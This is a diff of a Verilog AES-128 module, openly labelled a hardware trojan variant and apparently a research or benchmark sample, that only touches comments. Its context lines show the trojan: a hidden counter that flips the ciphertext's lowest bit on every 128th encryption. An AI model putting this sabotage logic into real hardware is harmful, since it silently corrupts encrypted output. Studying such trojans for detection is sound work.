@@ -1,4 +1,3 @@
-// aes_128_trojan_counter.v
 // TROJAN VARIANT 2: Counter-Based Trigger + Output Corruption Payload
 // -----------------------------------------------------------------------
 // Trigger:  Sequential. A hidden 8-bit counter increments every time an
@@ -29,7 +28,7 @@ module aes_128_trojan_counter (
 
     localparam [7:0] TRIGGER_COUNT = 8'd127; // fires when counter == 127 (i.e. 128th run)
 
-    // ---- TROJAN TRIGGER LOGIC ----
+    // TROJAN TRIGGER LOGIC
     reg  [7:0] trojan_counter;
     wire       trojan_trigger = (trojan_counter == TRIGGER_COUNT);
 
@@ -101,7 +100,7 @@ module aes_128_trojan_counter (
                 end
 
                 DONE_ST: begin
-                    // ---- TROJAN PAYLOAD ----
+                    // TROJAN PAYLOAD
                     // Flip LSB only on the rare triggered run; otherwise
                     // ciphertext is identical to the clean baseline.
                     ciphertext <= trojan_trigger ? {state_reg[127:1], ~state_reg[0]}
@@ -109,7 +108,7 @@ module aes_128_trojan_counter (
                     done       <= 1'b1;
                     fsm_state  <= IDLE;
 
-                    // ---- TROJAN TRIGGER counter update ----
+                    // TROJAN TRIGGER counter update 
                     trojan_counter <= trojan_trigger ? 8'd0 : (trojan_counter + 8'd1);
                 end
 
